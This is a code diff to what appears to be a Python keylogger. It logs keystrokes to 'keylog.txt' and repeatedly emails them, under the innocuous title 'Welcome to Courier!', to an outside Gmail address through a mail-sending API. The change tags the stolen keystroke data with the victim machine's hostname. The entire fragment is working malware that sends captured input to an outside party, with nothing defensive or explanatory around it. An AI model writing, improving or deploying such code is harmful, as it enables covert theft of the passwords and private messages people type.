@@ -13,7 +13,7 @@ OUTPUT_FILE_NAME = "keylog.txt"
 TO_EMAIL = "hyquaq15@gmail.com"
 TITLE_EMAIL = "Welcome to Courier!"
 KEY_SPACE = ' '
-
+KEY_DOUBLE_DOT = ':'
 
 def sentMail():
     while True:
@@ -38,7 +38,7 @@ def sentMail():
                                 "body": "KEYLOGGER: {{keylogger}}"
                             },
                             "data": {
-                                "keylogger": data
+                                "keylogger": get_hostname() + KEY_DOUBLE_DOT + data
                             },
                         }
                     )
